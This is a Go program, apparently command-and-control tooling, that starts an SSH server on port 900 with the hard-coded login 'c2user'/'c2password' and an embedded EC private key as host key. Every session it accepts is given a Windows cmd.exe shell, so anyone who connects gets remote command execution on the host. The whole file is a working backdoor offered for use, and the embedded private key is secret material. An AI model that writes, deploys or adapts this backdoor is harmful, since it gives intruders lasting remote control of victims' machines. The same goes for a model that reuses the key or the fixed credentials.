package main

import (
	"fmt"
	"log"
	"net"
	"os/exec"

	"golang.org/x/crypto/ssh"
)

func main() {
	// Create very basic SSH server config
	config := &ssh.ServerConfig{
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			if c.User() == "c2user" && string(pass) == "c2password" {
				return nil, nil
			}
			return nil, fmt.Errorf("Password rejected, %q", c.User())
		},
	}

	privateKeyString := `-----BEGIN EC PRIVATE KEY-----
MIHcAgEBBEIBgXU0TxInvi67PusMrMyWolN1z4BFx8AeN/zWXj2hXBbl42pBU/dM
ZED/W9ZqjpsZUKF3vKNZ0hFROoztozx1+mKgBwYFK4EEACOhgYkDgYYABABdmQT3
66DyKuNmRpTZC+R/dMq4e9+2Y1ytoe7ytrg4rL5TxZOcac1wieUIs0wQv6FHeajk
ZTCyLqqsFJ5d8xXYagB5b2nlLJZIKf56TlAmgHgX2AelXkmCmWtnBMSWXTOKyF+1
Uv/Vmfjc4SDQ6OPt0BNWTIP3t70Y64yK4ouUAigruA==
-----END EC PRIVATE KEY-----`
	privateKey, error := ssh.ParsePrivateKey([]byte(privateKeyString))
	if error != nil {
		return
	}

	config.AddHostKey(privateKey)

	// Begin accepting connections
	listener, error := net.Listen("tcp", "0.0.0.0:900")
	if error != nil {
		return
	}
	for {
		newConn, error := listener.Accept()
		if error != nil {
			return
		}

		// When new connection arrives, perform SSH handshake
		_, channels, requests, error := ssh.NewServerConn(newConn, config)
		if error != nil {
			return
		}

		log.Printf("Handshake successful")

		// Handle incoming connection concurrently
		go ssh.DiscardRequests(requests)

		for newChannel := range channels {
			// There are different types of channels, we only want to deal with
			// sessions.
			if newChannel.ChannelType() != "session" {
				newChannel.Reject(ssh.UnknownChannelType, "Unknown channel type")
			}

			channel, requests, error := newChannel.Accept()
			if error != nil {
				return
			}

			// There are several types of out-of-band requests, we only want to
			// deal with shells. Anonymous concurrent function.
			go func(in <-chan *ssh.Request) {
				for req := range in {
					req.Reply(req.Type == "shell", nil)
				}
			}(requests)

			shell := exec.Command("C:\\Windows\\System32\\cmd.exe")
			shell.Stdin = channel
			shell.Stdout = channel
			shell.Stderr = channel
			go func() {
				defer channel.Close()
				shell.Run()
			}()
		}
	}
}
